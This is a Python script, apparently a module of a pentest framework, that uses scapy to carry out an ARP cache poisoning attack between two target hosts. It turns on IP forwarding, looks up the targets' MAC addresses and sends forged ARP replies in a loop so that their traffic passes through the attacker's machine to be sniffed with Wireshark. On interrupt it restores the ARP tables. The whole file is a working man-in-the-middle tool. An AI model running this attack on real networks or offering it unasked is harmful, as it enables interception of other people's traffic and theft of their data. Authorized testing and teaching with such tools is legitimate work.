#!/usr/bin/python3

from scapy.all import *
from time import sleep
import sys

options = [
		['address1','','Target address to be poisoned.'],
		['address2','','Target address to be poisoned.']	
	]

def show_info():
	print("This module can be used to poison ARP tables of master host and slave host. You need Wireshark to actually see the traffic between them.")

# return target MAC address from IP address
def get_mac(target):
	return getmacbyip(target)
	
# Enables forwarding in /proc/sys/net/ipv4/ip_forward
def set_forward():
	try:
		with open("/proc/sys/net/ipv4/ip_forward",'r') as forward:
			for line in forward :
				check = line.strip()
				
		if check == "1" :
			print("[*] Forwarding already enabled...")
		elif check == "0" :
			with open("/proc/sys/net/ipv4/ip_forward",'w') as forward:
				forward.truncate()
				forward.write("1")
			print("[*] Forwarding enabled...")
			return check
		else :
			print("[-] Error on /proc/sys/net/ipv4/ip_forward")
	except:
		print("[-] You should be root to run this script!")
		return None

# Restores forwarding's configuration in /proc/sys/net/ipv4/ip_forward		
def back_forward(check):
	if check == "0" :
		with open("/proc/sys/net/ipv4/ip_forward",'w') as forward:
				forward.truncate()
				forward.write("0")

# Poison ARP attack to targets
def poison(address_1,address_2,mac_1,mac_2):
	payload_1 = ARP(op=2, pdst=address_1, psrc=address_2, hwdst=mac_1)
	send(payload_1, verbose=False)
	payload_2 = ARP(op=2, pdst=address_2, psrc=address_1, hwdst=mac_2)
	send(payload_2, verbose=False)

# Restore ARP tables 
def restore_tables(address_1,address_2,mac_1,mac_2):
	restore_1 = ARP(op=2, pdst=address_1, psrc=address_2, hwdst=mac_1, hwsrc=mac_2)
	restore_2 = ARP(op=2, pdst=address_2, psrc=address_1, hwdst=mac_2, hwsrc=mac_1)
	send(restore_1, verbose=False)
	send(restore_2, verbose=False)
	
def main():

	address_1 = options[0][1]
	address_2 = options[1][1]
	mac_1 = ""
	mac_2 = ""

	check = set_forward()
	print("[*] IP FORWARDING ENABLED.")
		
	try:
		print("[*] Getting targets' MAC addresses...")
		sleep(1)
		mac_1 = get_mac(address_1)
		print("[*] MAC address 1: "+mac_1)
		sleep(1)
		mac_2 = get_mac(address_2)
		print("[*] MAC address 2: "+mac_2)
		sleep(1)
	except:
		back_forward(check)
		print("[-] Getting errors while retriving MAC addresses... ")
		return None

	try:
		print("[+] ...Poisoning started... [+]")
		print("Use wireshark to sniff traffic...")
		print(" ")
		print("      Use CTRL^C to stop :)    ")
		while True:
			poison(address_1,address_2,mac_1,mac_2)	
		
	except KeyboardInterrupt :
		restore_tables(address_1,address_2,mac_1,mac_2)
		print("[*] ARP TABLES restored!")
		back_forward(check)
		print("[*] Forwarding configurations restored.")
		
if __name__ == "__main__" :
	main()
